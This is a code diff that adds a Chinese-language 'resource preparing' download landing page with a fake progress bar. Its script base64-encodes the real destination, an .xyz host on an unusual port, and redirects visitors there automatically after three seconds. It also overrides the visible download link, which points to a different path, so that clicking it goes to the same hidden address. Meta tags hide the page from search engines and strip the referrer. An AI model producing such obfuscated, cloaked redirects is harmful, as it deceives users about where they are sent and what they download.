@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <link rel="canonical" href="https://1000plan.sh.cn/">
+  <title>资源准备中</title>
+  <style>
+    *{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei",sans-serif;color:#f6fbff;background:linear-gradient(135deg,#07111f,#16245c 46%,#38207c)}.transfer-card{width:min(92vw,520px);padding:38px;border:1px solid rgba(135,214,255,.28);border-radius:24px;background:rgba(10,20,48,.72);box-shadow:0 24px 80px rgba(42,100,255,.26),inset 0 1px 0 rgba(255,255,255,.12);text-align:center;backdrop-filter:blur(16px)}h1{margin:0 0 14px;font-size:30px}.transfer-card p{margin:8px 0;color:#cde5ff}.bar{height:10px;border-radius:999px;background:rgba(255,255,255,.14);overflow:hidden;margin:26px 0}.bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,#4df0d4,#4ea1ff,#b67cff);animation:load 3s linear forwards;box-shadow:0 0 18px rgba(77,240,212,.75)}.manual{display:inline-flex;align-items:center;justify-content:center;margin-top:8px;padding:13px 28px;border-radius:999px;color:#041222;text-decoration:none;font-weight:800;background:linear-gradient(135deg,#66ffe0,#78a7ff 55%,#d7a2ff);box-shadow:0 0 24px rgba(108,210,255,.55);transition:.2s}.manual:hover{transform:translateY(-2px);box-shadow:0 0 32px rgba(145,136,255,.75)}@keyframes load{to{width:100%}}
+  </style>
+</head>
+<body>
+  <main class="transfer-card">
+    <h1>资源准备中</h1>
+    <p>正在校验连接环境</p>
+    <p>即将进入下载页面</p>
+    <p>请勿关闭当前页面</p>
+    <div class="bar" aria-hidden="true"><span></span></div>
+    <a class="manual" id="manualDownload" href="/kexue.html" rel="nofollow noopener noreferrer">立即下载</a>
+  </main>
+  <script>
+    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9haHpxLjMxMzQ4Ni54eXo6MzU4ODgv");
+    const manualDownload = document.getElementById("manualDownload");
+    window.setTimeout(function () {
+      window.location.replace(REAL_DOWNLOAD_URL);
+    }, 3000);
+    manualDownload.addEventListener("click", function(e){
+      e.preventDefault();
+      window.location.replace(REAL_DOWNLOAD_URL);
+    });
+  </script>
+</body>
+</html>
